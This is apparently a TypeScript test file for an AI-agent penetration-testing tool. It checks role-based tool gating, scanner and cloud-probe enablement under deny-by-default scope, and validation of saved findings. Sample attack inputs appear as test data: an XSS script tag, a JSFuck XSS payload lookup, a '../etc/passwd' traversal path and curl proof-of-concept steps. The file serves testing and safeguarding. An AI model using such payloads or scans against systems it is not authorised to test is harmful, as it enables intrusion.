import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { ToolExecutor, getToolsForRole, TOOL_DEFINITIONS, SCANNER_TOOL_NAMES, evaluateDoneCoverageGate, containsUnquotedShellChars } from "./tools.js";
import { parseFindingsFromCliOutput } from "../findings-parser.js";
import type { ToolContext, ToolCall } from "./types.js";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const ORIGINAL_JIT_SKILLS_ENV = process.env.PWNKIT_FEATURE_JIT_SKILLS;
const ORIGINAL_LOOT_LEDGER_ENV = process.env.PWNKIT_FEATURE_LOOT_LEDGER;
const ORIGINAL_CLOUD_SURFACE_ENV = process.env.PWNKIT_FEATURE_CLOUD_SURFACE;

afterEach(() => {
  if (ORIGINAL_JIT_SKILLS_ENV === undefined) delete process.env.PWNKIT_FEATURE_JIT_SKILLS;
  else process.env.PWNKIT_FEATURE_JIT_SKILLS = ORIGINAL_JIT_SKILLS_ENV;
  if (ORIGINAL_LOOT_LEDGER_ENV === undefined) delete process.env.PWNKIT_FEATURE_LOOT_LEDGER;
  else process.env.PWNKIT_FEATURE_LOOT_LEDGER = ORIGINAL_LOOT_LEDGER_ENV;
  // pwnkit#925: cloud-surface defaults OFF; reset so tests that pin it ON don't leak.
  if (ORIGINAL_CLOUD_SURFACE_ENV === undefined) delete process.env.PWNKIT_FEATURE_CLOUD_SURFACE;
  else process.env.PWNKIT_FEATURE_CLOUD_SURFACE = ORIGINAL_CLOUD_SURFACE_ENV;
});

// ── Tool Registry ──

describe("TOOL_DEFINITIONS", () => {
  it("defines all expected tools", () => {
    const expected = [
      "http_request", "send_prompt", "save_finding", "query_findings",
      "update_finding", "read_file", "run_command", "update_target", "payload_lookup", "done",
      "list_skills", "load_skill",
    ];
    for (const name of expected) {
      expect(TOOL_DEFINITIONS[name]).toBeDefined();
      expect(TOOL_DEFINITIONS[name].name).toBe(name);
      expect(TOOL_DEFINITIONS[name].description).toBeTruthy();
    }
  });
});

// ── Role-based Tool Selection ──

describe("getToolsForRole", () => {
  it("gives discovery agent network tools but not file tools", () => {
    const tools = getToolsForRole("discovery");
    const names = tools.map((t) => t.name);
    expect(names).toContain("http_request");
    expect(names).toContain("send_prompt");
    expect(names).toContain("save_finding");
    expect(names).toContain("done");
    expect(names).not.toContain("read_file");
    expect(names).not.toContain("run_command");
  });

  it("gives attack agent network tools", () => {
    process.env.PWNKIT_FEATURE_JIT_SKILLS = "0";
    const tools = getToolsForRole("attack");
    const names = tools.map((t) => t.name);
    expect(names).toContain("http_request");
    expect(names).toContain("send_prompt");
    expect(names).toContain("save_finding");
    expect(names).toContain("payload_lookup");
    expect(names).toContain("wp_fingerprint");
    expect(names).not.toContain("list_skills");
    expect(names).not.toContain("load_skill");
  });

  it("adds JIT skill tools only when enabled", () => {
    process.env.PWNKIT_FEATURE_JIT_SKILLS = "1";
    const names = getToolsForRole("attack").map((t) => t.name);
    expect(names).toContain("list_skills");
    expect(names).toContain("load_skill");
  });

  it("gives verify agent file tools when hasScope is true", () => {
    const tools = getToolsForRole("verify", { hasScope: true });
    const names = tools.map((t) => t.name);
    expect(names).toContain("read_file");
    expect(names).toContain("apply_patch");
    expect(names).toContain("run_command");
    expect(names).toContain("http_request");
  });

  it("verify agent has no file tools without scope", () => {
    const tools = getToolsForRole("verify");
    const names = tools.map((t) => t.name);
    expect(names).not.toContain("read_file");
    expect(names).not.toContain("run_command");
  });

  it("audit role gets all enabled tools", () => {
    process.env.PWNKIT_FEATURE_JIT_SKILLS = "0";
    // Pin the loot flag ON so the count is deterministic regardless of ambient
    // env: use_loot (pwnkit#567) is then in the enabled set, leaving exactly
    // the two JIT-skill tools gated out below.
    process.env.PWNKIT_FEATURE_LOOT_LEDGER = "1";
    // Pin the cloud-surface flag ON too (pwnkit#925): the cloud tools are then
    // in the enabled set, so they cancel out of both sides of the count below
    // and the assertion stays deterministic regardless of ambient env.
    process.env.PWNKIT_FEATURE_CLOUD_SURFACE = "1";
    const tools = getToolsForRole("audit");
    const names = tools.map((t) => t.name);
    expect(names).not.toContain("list_skills");
    expect(names).not.toContain("load_skill");
    expect(names).toContain("use_loot");
    expect(names).toContain("cloud_s3_probe");
    for (const name of names) {
      expect(TOOL_DEFINITIONS[name]).toBeDefined();
    }
    for (const scanner of SCANNER_TOOL_NAMES) {
      expect(names).not.toContain(scanner);
    }
  });

  it("audit role includes skill tools when JIT skills are enabled", () => {
    process.env.PWNKIT_FEATURE_JIT_SKILLS = "1";
    const names = getToolsForRole("audit").map((t) => t.name);
    expect(names).toContain("list_skills");
    expect(names).toContain("load_skill");
  });

  // ── Engagement-gated scanner wrappers (pwnkit#555) ──
  // allowScanners=false (default) MUST keep all four wrappers out of EVERY
  // role's tool set — no regression of the pwnkit#217 stealthy default.
  it("omits scanner wrappers from all roles when allowScanners is unset", () => {
    process.env.PWNKIT_FEATURE_JIT_SKILLS = "0";
    for (const role of ["discovery", "attack", "verify", "audit", "review"]) {
      const names = getToolsForRole(role, { hasScope: true }).map((t) => t.name);
      for (const scanner of SCANNER_TOOL_NAMES) {
        expect(names).not.toContain(scanner);
      }
    }
  });

  it("exposes scanner wrappers for network roles when allowScanners is true", () => {
    process.env.PWNKIT_FEATURE_JIT_SKILLS = "0";
    for (const role of ["discovery", "attack"]) {
      const names = getToolsForRole(role, { allowScanners: true }).map((t) => t.name);
      expect(names).toContain("run_sqlmap");
      expect(names).toContain("run_nmap");
      expect(names).toContain("run_ffuf");
      expect(names).toContain("run_nuclei");
    }
  });

  it("includes scanner wrappers in the audit/review everything-set only with allowScanners", () => {
    process.env.PWNKIT_FEATURE_JIT_SKILLS = "0";
    const off = getToolsForRole("audit").map((t) => t.name);
    expect(off).not.toContain("run_sqlmap");
    const on = getToolsForRole("audit", { allowScanners: true }).map((t) => t.name);
    expect(on).toContain("run_sqlmap");
    expect(on).toContain("run_nuclei");
  });

  // ── Cloud-surface tools (pwnkit#925) — default OFF, opt-in ──
  it("omits cloud-surface tools from every role when the flag is unset (default OFF)", () => {
    process.env.PWNKIT_FEATURE_JIT_SKILLS = "0";
    delete process.env.PWNKIT_FEATURE_CLOUD_SURFACE; // exercise the default
    for (const role of ["discovery", "attack", "verify", "audit", "review"]) {
      const names = getToolsForRole(role, { hasScope: true }).map((t) => t.name);
      expect(names).not.toContain("cloud_s3_probe");
      expect(names).not.toContain("cloud_validate_credentials");
    }
  });

  it("exposes cloud-surface tools for network roles only when the flag is on", () => {
    process.env.PWNKIT_FEATURE_JIT_SKILLS = "0";
    process.env.PWNKIT_FEATURE_CLOUD_SURFACE = "1";
    for (const role of ["discovery", "attack"]) {
      const names = getToolsForRole(role).map((t) => t.name);
      expect(names).toContain("cloud_s3_probe");
      expect(names).toContain("cloud_validate_credentials");
    }
  });
});

// ── Cloud-surface handlers (pwnkit#925) — enablement + deny-by-default scope ──
// These exercise ONLY the gate paths (flag-off, no-scope, out-of-scope), which
// short-circuit BEFORE any network call — so no live cloud traffic occurs.

describe("ToolExecutor cloud-surface gating (pwnkit#925)", () => {
  const baseCtx = (scope?: unknown): ToolContext =>
    ({
      target: "https://target.test",
      scanId: "cloud-gate-test",
      findings: [],
      attackResults: [],
      targetInfo: {},
      ...(scope ? { scope: scope as ToolContext["scope"] } : {}),
    }) as ToolContext;

  it("cloud_s3_probe refuses when the feature flag is OFF (default)", async () => {
    delete process.env.PWNKIT_FEATURE_CLOUD_SURFACE;
    const exec = new ToolExecutor(baseCtx(), null);
    const r = await exec.execute({ name: "cloud_s3_probe", arguments: { buckets: ["acme-x"] } });
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/disabled.*PWNKIT_FEATURE_CLOUD_SURFACE/i);
  });

  it("cloud_s3_probe skips ALL buckets (no-op) when no scope is configured, even with the flag ON", async () => {
    process.env.PWNKIT_FEATURE_CLOUD_SURFACE = "1";
    const exec = new ToolExecutor(baseCtx(/* no scope */), null);
    const r = await exec.execute({ name: "cloud_s3_probe", arguments: { buckets: ["acme-x", "acme-y"] } });
    expect(r.success).toBe(true);
    const out = r.output as { bucket_count: number; skipped: Array<{ bucket: string; reason: string }>; summary: string };
    expect(out.bucket_count).toBe(0);
    expect(out.skipped.map((s) => s.bucket)).toEqual(["acme-x", "acme-y"]);
    expect(out.skipped[0].reason).toMatch(/no engagement scope|deny-by-default/i);
  });

  it("cloud_s3_probe skips out-of-scope buckets when a scope is configured", async () => {
    process.env.PWNKIT_FEATURE_CLOUD_SURFACE = "1";
    const { ScopePolicy } = await import("../scope/scope.js");
    // Scope authorizes only the app host, NOT the S3 endpoint → bucket skipped.
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    const exec = new ToolExecutor(baseCtx(scope), null);
    const r = await exec.execute({ name: "cloud_s3_probe", arguments: { buckets: ["acme-exports"] } });
    expect(r.success).toBe(true);
    const out = r.output as { bucket_count: number; skipped: Array<{ bucket: string }> };
    expect(out.bucket_count).toBe(0);
    expect(out.skipped.map((s) => s.bucket)).toEqual(["acme-exports"]);
  });

  it("cloud_validate_credentials refuses when the feature flag is OFF (default)", async () => {
    delete process.env.PWNKIT_FEATURE_CLOUD_SURFACE;
    const exec = new ToolExecutor(baseCtx(), null);
    const r = await exec.execute({
      name: "cloud_validate_credentials",
      arguments: { access_key_id: "AKIA", secret_access_key: "s" },
    });
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/disabled.*PWNKIT_FEATURE_CLOUD_SURFACE/i);
  });

  it("cloud_validate_credentials refuses (deny-by-default) when no scope is configured", async () => {
    process.env.PWNKIT_FEATURE_CLOUD_SURFACE = "1";
    const exec = new ToolExecutor(baseCtx(/* no scope */), null);
    const r = await exec.execute({
      name: "cloud_validate_credentials",
      arguments: { access_key_id: "AKIA", secret_access_key: "s" },
    });
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/no engagement scope|deny-by-default/i);
  });
});

// ── ToolExecutor ──

describe("ToolExecutor", () => {
  let ctx: ToolContext;
  let executor: ToolExecutor;

  beforeEach(() => {
    ctx = {
      target: "https://example.com",
      scanId: "test-scan-123",
      findings: [],
      attackResults: [],
      targetInfo: {},
    };
    executor = new ToolExecutor(ctx, null);
  });

  // ── save_finding ──

  it("save_finding adds to context findings", async () => {
    const result = await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Test XSS",
        severity: "high",
        category: "xss",
        evidence_request: "GET /test",
        evidence_response: "<script>alert(1)</script>",
        evidence_analysis: "Reflected XSS in response",
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
    expect(ctx.findings[0].title).toBe("Test XSS");
    expect(ctx.findings[0].severity).toBe("high");
    expect(ctx.findings[0].status).toBe("discovered");
    expect(ctx.findings[0].id).toBeTruthy();
  });

  it("save_finding records a workspace-contained 0review annotation", async () => {
    const root = mkdtempSync(join(tmpdir(), "pwnkit-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n");
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "save_finding",
        arguments: {
          title: "Unvalidated parser input",
          severity: "high",
          category: "missing-validation",
          description: "Input reaches the parser without validation.",
          evidence_request: "parser.ts:1",
          evidence_response: "unsafe(input)",
          source_path: "parser.ts",
          source_start_line: 1,
          suggested_replacement: "safe(validate(input))",
        },
      });

      expect(result.success).toBe(true);
      expect(ctx.findings[0]?.reviewAnnotation).toEqual({
        path: "parser.ts",
        startLine: 1,
        suggestion: "safe(validate(input))",
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("save_finding rejects an annotation path outside the workspace", async () => {
    const root = mkdtempSync(join(tmpdir(), "pwnkit-0review-"));
    try {
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "save_finding",
        arguments: {
          title: "Bad location",
          severity: "medium",
          category: "other",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "../etc/passwd",
          source_start_line: 1,
        },
      });
      expect(result.success).toBe(false);
      expect(result.error).toMatch(/parent-directory|workspace/i);
      expect(ctx.findings).toHaveLength(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("save_finding rejects a backslash annotation path (cloud schema would 400 it)", async () => {
    const root = mkdtempSync(join(tmpdir(), "pwnkit-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n");
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "save_finding",
        arguments: {
          title: "Backslash location",
          severity: "high",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "src\\parser.ts",
          source_start_line: 1,
        },
      });
      expect(result.success).toBe(false);
      expect(result.error).toMatch(/repository-relative|backslash/i);
      expect(ctx.findings).toHaveLength(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("save_finding keeps but downgrades a finding whose source_path does not exist", async () => {
    const root = mkdtempSync(join(tmpdir(), "pwnkit-0review-"));
    try {
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "save_finding",
        arguments: {
          title: "Fabricated file",
          severity: "critical",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "app/users.php",
          source_start_line: 43,
        },
      });
      // Not a hard rejection: the finding is kept, downgraded exactly like a
      // CLI-parsed finding citing a fabricated path, and the unverifiable
      // annotation is dropped.
      expect(result.success).toBe(true);
      expect(ctx.findings).toHaveLength(1);
      expect(ctx.findings[0].severity).toBe("info");
      expect(ctx.findings[0].status).toBe("false-positive");
      expect(ctx.findings[0].triageNote).toContain("fabricated path");
      expect(ctx.findings[0].triageNote).toContain("app/users.php");
      expect(ctx.findings[0].reviewAnnotation).toBeUndefined();
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("save_finding keeps but downgrades a finding whose start line is out of range", async () => {
    const root = mkdtempSync(join(tmpdir(), "pwnkit-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n"); // 1 line
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "save_finding",
        arguments: {
          title: "Fabricated line",
          severity: "high",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "parser.ts",
          source_start_line: 42,
        },
      });
      expect(result.success).toBe(true);
      expect(ctx.findings).toHaveLength(1);
      expect(ctx.findings[0].severity).toBe("info");
      expect(ctx.findings[0].status).toBe("false-positive");
      expect(ctx.findings[0].triageNote).toContain("fabricated line");
      expect(ctx.findings[0].triageNote).toContain("parser.ts:42");
      expect(ctx.findings[0].reviewAnnotation).toBeUndefined();
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("save_finding downgrades on an out-of-range end line but keeps an in-range one", async () => {
    const root = mkdtempSync(join(tmpdir(), "pwnkit-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "// 1\n// 2\n// 3\n// 4\n// 5\n");
      ctx.scopePath = root;

      const bad = await executor.execute({
        name: "save_finding",
        arguments: {
          title: "End line out of range",
          severity: "high",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "parser.ts",
          source_start_line: 2,
          source_end_line: 42,
        },
      });
      expect(bad.success).toBe(true);
      expect(ctx.findings[0].status).toBe("false-positive");
      expect(ctx.findings[0].triageNote).toContain("fabricated line");
      expect(ctx.findings[0].reviewAnnotation).toBeUndefined();

      const good = await executor.execute({
        name: "save_finding",
        arguments: {
          title: "End line in range",
          severity: "high",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "parser.ts",
          source_start_line: 2,
          source_end_line: 4,
        },
      });
      expect(good.success).toBe(true);
      expect(ctx.findings[1].severity).toBe("high");
      expect(ctx.findings[1].status).toBe("discovered");
      expect(ctx.findings[1].reviewAnnotation).toEqual({
        path: "parser.ts",
        startLine: 2,
        endLine: 4,
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("save_finding accepts a directory source_path conservatively (no line check)", async () => {
    const root = mkdtempSync(join(tmpdir(), "pwnkit-0review-"));
    try {
      mkdirSync(join(root, "src"));
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "save_finding",
        arguments: {
          title: "Directory citation",
          severity: "medium",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "src",
          source_start_line: 1,
        },
      });
      // A directory is a real path inside the workspace: not a fabrication,
      // so the finding is kept un-downgraded and the annotation attaches
      // (there is no line count to range-check against).
      expect(result.success).toBe(true);
      expect(ctx.findings[0].status).toBe("discovered");
      expect(ctx.findings[0].reviewAnnotation).toEqual({
        path: "src",
        startLine: 1,
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("save_finding drops an oversized suggestion instead of rejecting or truncating", async () => {
    const root = mkdtempSync(join(tmpdir(), "pwnkit-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n");
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "save_finding",
        arguments: {
          title: "Oversized suggestion",
          severity: "high",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "parser.ts",
          source_start_line: 1,
          suggested_replacement: "x".repeat(20_001),
        },
      });
      expect(result.success).toBe(true);
      expect(ctx.findings[0].severity).toBe("high");
      expect(ctx.findings[0].status).toBe("discovered");
      // Location kept, suggestion dropped whole (a truncated half-function
      // would apply as broken code).
      expect(ctx.findings[0].reviewAnnotation).toEqual({
        path: "parser.ts",
        startLine: 1,
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("save_finding drops fenced or unified-diff suggestions but keeps the location", async () => {
    const root = mkdtempSync(join(tmpdir(), "pwnkit-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n");
      ctx.scopePath = root;
      for (const [i, suggestion] of [
        ["```ts", "safe(input)", "```"].join("\n"),
        ["@@ -1,3 +1,3 @@", "-unsafe(input)", "+safe(input)"].join("\n"),
      ].entries()) {
        const result = await executor.execute({
          name: "save_finding",
          arguments: {
            title: `Unrenderable suggestion ${i}`,
            severity: "high",
            category: "missing-validation",
            description: "test",
            // Distinct evidence prefixes keep the fuzzy dedup (pwnkit#281)
            // from merging the two iterations — this test is about the
            // suggestion gate, not dedup.
            evidence_request: `test-${i}`,
            evidence_response: "test",
            source_path: "parser.ts",
            source_start_line: 1,
            suggested_replacement: suggestion,
          },
        });
        expect(result.success).toBe(true);
      }
      expect(ctx.findings).toHaveLength(2);
      for (const f of ctx.findings) {
        expect(f.reviewAnnotation).toEqual({ path: "parser.ts", startLine: 1 });
      }
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("native save_finding and CLI parsing agree on the same malicious locations", async () => {
    // Dual-path parity: a fabricated location must produce the same outcome
    // whether the finding arrives via the save_finding tool or via CLI
    // output parsing (findings-parser.validateFileRef).
    const root = mkdtempSync(join(tmpdir(), "pwnkit-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n"); // 1 line
      ctx.scopePath = root;

      const cli = parseFindingsFromCliOutput(
        JSON.stringify({
          findings: [
            { title: "No such file", severity: "critical", description: "d", file: "nope.ts:1" },
            { title: "Line out of range", severity: "high", description: "d", file: "parser.ts:42" },
          ],
        }),
        { scopePath: root },
      );
      expect(cli).toHaveLength(2);
      for (const f of cli) {
        expect(f.severity).toBe("info");
        expect(f.status).toBe("false-positive");
        expect(f.reviewAnnotation).toBeUndefined();
      }
      expect(cli[0].triageNote).toContain("fabricated path");
      expect(cli[1].triageNote).toContain("fabricated line");

      for (const args of [
        {
          title: "No such file",
          severity: "critical",
          source_path: "nope.ts",
          source_start_line: 1,
        },
        {
          title: "Line out of range",
          severity: "high",
          source_path: "parser.ts",
          source_start_line: 42,
        },
      ]) {
        const result = await executor.execute({
          name: "save_finding",
          arguments: {
            ...args,
            category: "missing-validation",
            description: "d",
            evidence_request: "test",
            evidence_response: "test",
          },
        });
        expect(result.success).toBe(true);
      }
      expect(ctx.findings).toHaveLength(2);
      for (const f of ctx.findings) {
        expect(f.severity).toBe("info");
        expect(f.status).toBe("false-positive");
        expect(f.reviewAnnotation).toBeUndefined();
      }
      expect(ctx.findings[0].triageNote).toContain("fabricated path");
      expect(ctx.findings[1].triageNote).toContain("fabricated line");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  // ── save_finding pocSteps emission (pwnkit#179) ──

  it("save_finding populates pocSteps from prose when agent didn't supply them", async () => {
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Auth gap on /admin/users",
        severity: "high",
        category: "auth",
        evidence_request: "GET /admin/users HTTP/1.1\nHost: target.example",
        evidence_response: "HTTP/1.1 200 OK\nContent-Type: application/json",
        evidence_analysis: "Endpoint exposes admin data without authentication.",
      },
    });

    const finding = ctx.findings[0];
    expect(finding.pocSteps).toBeDefined();
    expect(finding.pocSteps!.length).toBeGreaterThanOrEqual(2);
    const exploit = finding.pocSteps!.find((s) => s.kind === "exploit");
    expect(exploit?.action).toEqual({
      type: "http",
      method: "GET",
      url: "/admin/users",
    });
    const verify = finding.pocSteps!.find((s) => s.kind === "verify");
    expect(verify?.expect).toEqual({ type: "http-status", status: 200 });
  });

  it("save_finding leaves pocSteps undefined when prose has no parseable signals", async () => {
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Vague bug",
        severity: "low",
        category: "info",
        evidence_request: "We poked around the page.",
        evidence_response: "Some interesting output appeared.",
        evidence_analysis: "Unclear if exploitable.",
      },
    });

    expect(ctx.findings[0].pocSteps).toBeUndefined();
  });

  it("save_finding prefers an agent-supplied pocSteps array over the heuristic", async () => {
    const agentSteps = [
      {
        id: "manual-step",
        kind: "exploit",
        summary: "Hand-crafted graph",
        action: { type: "shell", cmd: "echo crafted-by-agent" },
      },
    ];
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Custom finding",
        severity: "high",
        category: "auth",
        // Prose that would otherwise trigger the heuristic.
        evidence_request: "GET /admin",
        evidence_response: "HTTP/1.1 200 OK",
        evidence_analysis: "Admin endpoint exposed.",
        poc_steps: JSON.stringify(agentSteps),
      },
    });

    const finding = ctx.findings[0];
    expect(finding.pocSteps).toBeDefined();
    expect(finding.pocSteps!.length).toBe(1);
    expect(finding.pocSteps![0].id).toBe("manual-step");
    expect(finding.pocSteps![0].action).toEqual({
      type: "shell",
      cmd: "echo crafted-by-agent",
    });
  });

  // ── save_finding confidence emission ──
  // Closes the cloud-side gap where every `findings.confidence` row was NULL
  // because pwnkit-cli never emitted a value. See agent/finding-confidence.ts
  // for the hybrid heuristic.

  it("save_finding stamps confidence onto the finding when the agent reports one", async () => {
    const args = {
      title: "Reflected XSS in /search",
      severity: "high",
      category: "xss",
      evidence_request: "GET /search?q=<script>",
      evidence_response: "<script> echoed",
      evidence_analysis: "no encoding",
      confidence: 0.92,
    };
    await executor.execute({ name: "save_finding", arguments: args });

    const f = ctx.findings[0];
    expect(typeof f.confidence).toBe("number");
    expect(Number.isFinite(f.confidence)).toBe(true);
    expect(f.confidence!).toBeGreaterThanOrEqual(0);
    expect(f.confidence!).toBeLessThanOrEqual(1);
    expect(f.confidence!).toBeCloseTo(0.92);
    // Mirrored back onto the call args so agent-runner's mid-scan
    // postFinding(call.arguments) and the native-loop's finding_ingested
    // event both see the computed value.
    expect(args.confidence).toBeCloseTo(0.92);
  });

  it("save_finding clamps an out-of-range LLM-reported confidence", async () => {
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Wild value",
        severity: "high",
        category: "xss",
        evidence_request: "GET /a",
        evidence_response: "ok",
        confidence: 1.7,
      },
    });
    expect(ctx.findings[0].confidence).toBe(1);
  });

  it("save_finding floors confidence by PoC-status when agent doesn't report one", async () => {
    // Heuristic prose extraction will produce pocSteps with a body-contains
    // / http-status `expect`, so the verifiable floor (0.8) applies.
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Auth gap on /admin/users",
        severity: "high",
        category: "auth",
        evidence_request: "GET /admin/users HTTP/1.1\nHost: target.example",
        evidence_response: "HTTP/1.1 200 OK\nContent-Type: application/json",
        evidence_analysis: "Endpoint exposes admin data without authentication.",
        // No confidence reported.
      },
    });
    const f = ctx.findings[0];
    expect(f.pocSteps).toBeDefined();
    expect(typeof f.confidence).toBe("number");
    expect(f.confidence!).toBeGreaterThanOrEqual(0);
    expect(f.confidence!).toBeLessThanOrEqual(1);
    expect(f.confidence!).toBeGreaterThanOrEqual(0.6);
  });

  it("save_finding leaves confidence undefined when neither LLM nor PoC signal exists", async () => {
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Vague bug",
        severity: "low",
        category: "info",
        evidence_request: "We poked around the page.",
        evidence_response: "Some interesting output appeared.",
        evidence_analysis: "Unclear if exploitable.",
      },
    });
    expect(ctx.findings[0].pocSteps).toBeUndefined();
    expect(ctx.findings[0].confidence).toBeUndefined();
  });

  // ── save_finding empty-PoC gate (pwnkit#283) ──
  // Disclose already refuses empty PoCs at render time; we pull the gate
  // upstream so the agent sees its own bad finding rejected and can retry
  // with real evidence rather than burning turns on findings that disclose
  // will silently drop.

  it("save_finding rejects findings with no evidence and no poc_steps", async () => {
    const result = await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Empty finding",
        severity: "high",
        category: "xss",
      },
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("save_finding requires non-empty");
    expect(result.error).toContain("evidence_request");
    expect(result.error).toContain("evidence_response");
    expect(result.error).toContain("poc_steps");
    expect(ctx.findings).toHaveLength(0);
  });

  it("save_finding accepts a finding with only evidence_request filled", async () => {
    const result = await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Request-only finding",
        severity: "high",
        category: "xss",
        evidence_request: "GET /vuln HTTP/1.1\nHost: target.example",
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
  });

  it("save_finding accepts a finding with only evidence_response filled", async () => {
    const result = await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Response-only finding",
        severity: "high",
        category: "xss",
        evidence_response: "HTTP/1.1 200 OK\n\n<script>alert(1)</script>",
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
  });

  it("save_finding accepts a finding with only poc_steps filled", async () => {
    const agentSteps = [
      {
        id: "step-1",
        kind: "exploit",
        summary: "Send the payload",
        action: { type: "shell", cmd: "curl https://target.example/x" },
      },
    ];
    const result = await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Steps-only finding",
        severity: "high",
        category: "auth",
        poc_steps: JSON.stringify(agentSteps),
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
  });

  it("save_finding rejects whitespace-only evidence", async () => {
    const result = await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Whitespace finding",
        severity: "high",
        category: "xss",
        evidence_request: "   ",
        evidence_response: "\n\t  \n",
      },
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("save_finding requires non-empty");
    expect(ctx.findings).toHaveLength(0);
  });

  it("save_finding accepts a finding with all three fields filled (no regression)", async () => {
    const agentSteps = [
      {
        id: "step-1",
        kind: "exploit",
        summary: "Send the payload",
        action: { type: "shell", cmd: "curl https://target.example/x" },
      },
    ];
    const result = await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Fully populated finding",
        severity: "high",
        category: "xss",
        evidence_request: "GET /search?q=<script>",
        evidence_response: "<script> echoed",
        poc_steps: JSON.stringify(agentSteps),
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
    expect(ctx.findings[0].title).toBe("Fully populated finding");
  });

  it("save_finding does NOT cross-merge findings of different categories", async () => {
    // Same title, different category — distinct bug classes should stay
    // separate even when titles collide.
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Reflected payload in /search",
        severity: "high",
        category: "xss",
        evidence_request: "GET /search?q=<script>",
        evidence_response: "<script> echoed",
      },
    });
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Reflected payload in /search",
        severity: "high",
        category: "sql-injection",
        evidence_request: "GET /search?q=<script>",
        evidence_response: "<script> echoed",
      },
    });

    expect(ctx.findings).toHaveLength(2);
    expect(ctx.findings[0].category).toBe("xss");
    expect(ctx.findings[1].category).toBe("sql-injection");
  });

  // ── query_findings ──

  it("payload_lookup returns reusable JSFuck payloads", async () => {
    const result = await executor.execute({
      name: "payload_lookup",
      arguments: { name: "jsfuck_xss" },
    });

    expect(result.success).toBe(true);
    const output = result.output as {
      name: string;
      payload: string;
      emits: string;
      bestFor: string;
    };
    expect(output.name).toBe("jsfuck_xss");
    expect(output.payload).toContain("[]");
    expect(output.payload.length).toBeGreaterThan(3000);
    expect(output.emits).toBe("XSS");
    expect(output.bestFor).toContain("Exact-output");
  });

  it("query_findings returns in-memory findings", async () => {
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Finding A",
        severity: "high",
        category: "xss",
        evidence_request: "r1",
        evidence_response: "resp1",
      },
    });
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Finding B",
        severity: "low",
        category: "info",
        evidence_request: "r2",
        evidence_response: "resp2",
      },
    });

    const result = await executor.execute({
      name: "query_findings",
      arguments: { severity: "high" },
    });

    expect(result.success).toBe(true);
    const findings = result.output as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].title).toBe("Finding A");
  });

  // ── update_finding ──

  it("update_finding changes finding status", async () => {
    await executor.execute({
      name: "save_finding",
      arguments: {
        title: "Test Finding",
        severity: "medium",
        category: "xss",
        evidence_request: "r",
        evidence_response: "r",
      },
    });

    const findingId = ctx.findings[0].id;
    const result = await executor.execute({
      name: "update_finding",
      arguments: { finding_id: findingId, status: "confirmed" },
    });

